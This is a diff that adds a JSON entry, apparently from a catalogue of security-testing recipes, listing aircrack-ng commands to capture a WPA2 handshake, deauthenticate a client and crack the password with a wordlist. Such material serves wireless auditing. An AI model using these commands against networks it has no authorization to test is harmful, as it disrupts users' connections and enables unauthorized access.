@@ -1,0 +1,14 @@
+{
+  "wifi_hacking": {
+    "title": "WiFi Hacking - Aircrack-ng",
+    "category": "Wireless Attacks",
+    "desc": "Audit 802.11 wireless network security.",
+    "steps": [
+      ["Enable monitor mode", "sudo airmon-ng start wlan0"],
+      ["Scan wireless networks", "sudo airodump-ng wlan0mon"],
+      ["Capture target handshake", "sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon"],
+      ["Deauthenticate target client", "sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon"],
+      ["Crack WPA2 4-way handshake", "aircrack-ng -w rockyou.txt capture-01.cap"]
+    ]
+  }
+}
